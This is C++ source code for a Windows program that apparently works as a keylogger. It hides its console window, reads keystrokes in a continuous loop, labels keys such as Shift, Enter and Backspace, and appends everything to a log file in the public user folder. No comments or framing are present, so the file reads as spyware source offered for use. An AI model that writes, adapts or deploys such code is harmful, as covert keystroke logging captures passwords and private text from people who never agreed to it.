#include <iostream>
#include <windows.h>
#include <conio.h>
#include <fstream>
using namespace std;

int keys(char key, fstream&);
void run_in_background(int visibility);

int main() {
    run_in_background(0);

    char key_press;
    int ascii_value;                                                 
    fstream afile;                                                 
    afile.open("C:/Users/Public/log.txt", ios::in | ios::out);                         
    afile.close();    

    while(true) {
    key_press = getch();
    ascii_value = key_press;
    
    if(7 < ascii_value && ascii_value < 256)
        keys(key_press, afile);  
    }    
    return 0;
}    

int keys(char key, fstream& file) {
    file.open("C:/Users/Public/log.txt", ios::app | ios::in | ios::out);
    if(file) {
        if(GetAsyncKeyState(VK_SHIFT)) {
            file << "[SHIFT]";
        }
        else if(GetAsyncKeyState(VK_ESCAPE)) {
            file << "[ESCAPE]";
        }                           
        else if(GetAsyncKeyState(VK_RETURN)) {
            file << "[ENTER]";
        }
        else if(GetAsyncKeyState(VK_CONTROL)) {
            file << "[CONTROL]";
        }
        else if(GetAsyncKeyState(VK_MENU)) {
            file << "[ALT]";
        }
        else if(GetAsyncKeyState(VK_DELETE)) {
            file << "[DELETE]";
        }
        else if(GetAsyncKeyState(VK_TAB)) {
            file << "[TAB]";
        }
        else if(GetAsyncKeyState(VK_BACK)){
            file << "[BACKSPACE]";
        }
        else 
            file << key;
        
    }
    file.close();
    return 0;
}

void run_in_background(int visibility){
    HWND window;
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, visibility);
}
